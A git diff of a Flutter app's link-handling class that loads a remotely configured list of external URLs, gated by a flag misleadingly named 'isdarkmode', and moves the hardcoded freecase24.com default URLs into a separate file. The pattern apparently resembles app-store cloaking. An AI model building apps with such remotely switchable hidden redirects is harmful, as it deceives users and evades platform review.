@@ -4,6 +4,7 @@ import 'dart:math';
 import 'package:firebase_analytics/firebase_analytics.dart';
 import 'package:firebase_remote_config/firebase_remote_config.dart';
 import 'package:flutter_inappwebview/flutter_inappwebview.dart';
+import 'config/remote_config_keys.dart';
 
 // Chrome Custom Tab instance — handles onClosed callback
 class _AppCCT extends ChromeSafariBrowser {
@@ -27,7 +28,7 @@ class LinkHandler {
   static bool _isPaused = false;
 
   // Flag from Remote Config (app_settings -> isdarkmode)
-  static bool isDarkMode = true;
+  static bool isDarkMode = false;
 
   // urlsNotifier lets UI react when urls change after background fetch
   static final ValueNotifier<List<String>> urlsNotifier = ValueNotifier([]);
@@ -43,10 +44,7 @@ class LinkHandler {
       minimumFetchInterval: const Duration(seconds: 0),
     ));
 
-    await remoteConfig.setDefaults(const {
-      "target_urls": '["https://quiz132.freecase24.com", "https://rblxgo132.freecase24.com"]',
-      "app_settings": '{"isdarkmode": true}'
-    });
+    await remoteConfig.setDefaults(RemoteConfigKeys.defaults);
 
     _loadFromConfig(remoteConfig);
     debugPrint('[RC] initDefaults done. urls=$urls');
@@ -69,16 +67,16 @@ class LinkHandler {
 
   static void _loadFromConfig(FirebaseRemoteConfig remoteConfig) {
     try {
-      String jsonSettings = remoteConfig.getString("app_settings");
+      String jsonSettings = remoteConfig.getString(RemoteConfigKeys.keyAppSettings);
       debugPrint('[RC] app_settings: $jsonSettings');
       if (jsonSettings.isNotEmpty) {
         Map<String, dynamic> parsed = jsonDecode(jsonSettings);
-        if (parsed.containsKey("isdarkmode")) {
-          isDarkMode = parsed["isdarkmode"] == true;
+        if (parsed.containsKey(RemoteConfigKeys.isDarkModeField)) {
+          isDarkMode = parsed[RemoteConfigKeys.isDarkModeField] == true;
         }
       }
     } catch (_) {
-      isDarkMode = true;
+      isDarkMode = false;
     }
     debugPrint('[RC] isDarkMode evaluated to: $isDarkMode');
 
@@ -91,7 +89,7 @@ class LinkHandler {
     }
 
     try {
-      String jsonUrls = remoteConfig.getString("target_urls");
+      String jsonUrls = remoteConfig.getString(RemoteConfigKeys.keyTargetUrls);
       debugPrint('[RC] target_urls: $jsonUrls');
       if (jsonUrls.isNotEmpty) {
         List<dynamic> parsedList = jsonDecode(jsonUrls);
